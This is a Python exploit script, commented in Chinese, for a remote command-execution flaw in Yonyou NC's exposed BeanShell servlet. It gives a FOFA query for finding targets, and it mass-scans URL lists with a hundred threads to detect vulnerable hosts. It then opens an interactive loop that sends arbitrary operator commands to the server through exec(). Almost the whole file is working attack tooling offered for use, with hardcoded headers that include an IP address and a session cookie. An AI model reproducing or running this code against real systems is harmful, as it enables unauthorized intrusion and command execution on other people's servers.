# 用友命令执行
# /servlet/~ic/bsh.servlet.BshServlet 它可以输入命令 进而导致命令执行

# fofa:icon_hash="1085941792"
import argparse,requests,re,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
	test="""██╗   ██╗ ██████╗ ███╗   ██╗ ██████╗██╗   ██╗ ██████╗ ██╗   ██╗        ███╗   
╚██╗ ██╔╝██╔═══██╗████╗  ██║██╔════╝╚██╗ ██╔╝██╔═══██╗██║   ██║        ████╗  ██║██╔════╝
 ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗╚████╔╝ ██║   ██║██║   ██║        ██╔██╗ ██║██║     
  ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║ ╚██╔╝  ██║   ██║██║   ██║        ██║╚██╗██║██║     
   ██║   ╚██████╔╝██║ ╚████║╚██████╔╝  ██║   ╚██████╔╝╚██████╔╝███████╗██║ ╚████║╚██████╗
                                                                           version:0.0.1
	"""
	print(test)

def main():
	banner()
	parse = argparse.ArgumentParser(description="用友nc命令执行检测")
	parse.add_argument("-u","--url",dest="url",type=str,help="input url")
	parse.add_argument("-f","--file",dest="file",type=str,help="input file path")
	args = parse.parse_args()

	if args.url and not args.file:
		if poc(args.url):
			exp(args.url)
	elif args.file and not args.url:
		line = []
		with open(args.file,"r",encoding="utf-8") as fp:
			for i in fp.readlines():
				line.append(i.strip().replace("\n",""))
		mp = Pool(100)
		mp.map(poc,line)
		mp.close()
		mp.join()
	else:
		print(f"Usag:\n\t python3 {sys.argv[0]}-h")


def poc(target):
	playload="/servlet/~ic/bsh.servlet.BshServlet"
	data="""bsh.script=print("SIS2402")"""
	headers = {
        'Content-Length':'28',
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'Origin':'http://8.130.46.216:8082',
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer':'http://8.130.46.216:8082/servlet/~ic/bsh.servlet.BshServlet',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Cookie':'JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server',
        'Connection':'close'
        }
	try:
		response = requests.get(url=target+playload)
		if response.status_code == 200:
			res = requests.post(url=target+playload,headers=headers,data=data)
			match = re.search(r'<pre>(.*?)</pre>',res.text,re.S)
			if "SIS2402" in match.group():
				with open("result.txt","a") as fp:
					print(f"{target}存在")
					fp.write(f"{target}"+"\n")
					return True
			else:
				print(f"不存在{target}")
				return False
	except Exception as e:
		print(f"{target}该站点可能存在,请手工尝试")
		return False

def exp(target):
	print("-------------正在进行漏洞利用，请稍后----------------")
	time.sleep(3)
	while True:
		playload="/servlet/~ic/bsh.servlet.BshServlet"
		cmd = input("请输入你要执行的命令")
		headers={
	            'Content-Length':'28',
	            'Cache-Control':'max-age=0',
	            'Upgrade-Insecure-Requests':'1',
	            'Origin':'http://8.130.46.216:8082',
	            'Content-Type':'application/x-www-form-urlencoded',
	            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36',
	            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	            'Referer':'http://8.130.46.216:8082/servlet/~ic/bsh.servlet.BshServlet',
	            'Accept-Encoding':'gzip, deflate',
	            'Accept-Language':'zh-CN,zh;q=0.9',
	            'Cookie':'JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server',
	            'Connection':'close',
		}
		data = f'bsh.script=exec("{cmd}")'
		if cmd == 'q':
			print("正在退出")
		else:
			response=requests.post(url=target+playload,headers=headers,data=data)
			match = re.search(r'<pre>(.*?)</pre>',response.text,re.S)
			print(match.group(1))
        
if __name__ == '__main__':
	main()